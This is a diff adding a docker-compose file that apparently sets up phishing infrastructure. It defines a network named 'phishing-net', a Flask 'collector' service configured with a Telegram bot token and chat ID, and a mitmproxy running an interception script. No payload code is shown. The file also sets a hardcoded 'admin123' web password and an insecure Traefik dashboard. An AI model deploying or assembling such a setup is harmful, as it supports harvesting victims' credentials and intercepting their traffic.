@@ -1,0 +1,60 @@
+networks:
+  phishing-net:
+    driver: bridge
+
+services:
+
+  traefik:
+    image: traefik:v2.11
+    container_name: traefik
+    restart: unless-stopped
+    networks:
+      - phishing-net
+    ports:
+      - "${TRAEFIK_HTTP_PORT}:80"
+      - "${TRAEFIK_DASHBOARD_PORT}:8080"
+    volumes:
+      - /var/run/docker.sock:/var/run/docker.sock:ro
+      - ./traefik:/config
+    command:
+      - "--api.insecure=true"
+      - "--providers.docker=true"
+      - "--providers.docker.exposedbydefault=false"
+      - "--entrypoints.web.address=:80"
+    labels:
+      - "traefik.enable=true"
+
+  flask:
+    build: ./flask
+    container_name: flask-collector
+    restart: unless-stopped
+    networks:
+      - phishing-net
+    volumes:
+      - ./flask/logs:/app/logs
+      - ./flask/templates:/app/templates
+    environment:
+      - TZ=${TZ}
+      - FLASK_ENV=production
+      - TELEGRAM_BOT_TOKEN=${TELEGRAM_BOT_TOKEN}
+      - TELEGRAM_CHAT_ID=${TELEGRAM_CHAT_ID}
+    labels:
+      - "traefik.enable=true"
+      - "traefik.http.routers.flask.rule=PathPrefix(`/`)"
+      - "traefik.http.routers.flask.entrypoints=web"
+      - "traefik.http.routers.flask.service=flask"
+      - "traefik.http.services.flask.loadbalancer.server.port=5000"
+
+  mitm:
+    image: mitmproxy/mitmproxy:latest
+    container_name: mitmproxy
+    restart: unless-stopped
+    networks:
+      - phishing-net
+    ports:
+      - "${MITM_PORT}:8082"
+      - "${MITM_WEB_PORT}:8081"
+    volumes:
+      - ./mitm/scripts:/scripts
+      - ./mitm/logs:/logs
+    command: mitmweb --web-host 0.0.0.0 --web-port 8081 --listen-port 8082 -s /scripts/intercept.py --set web_password=admin123
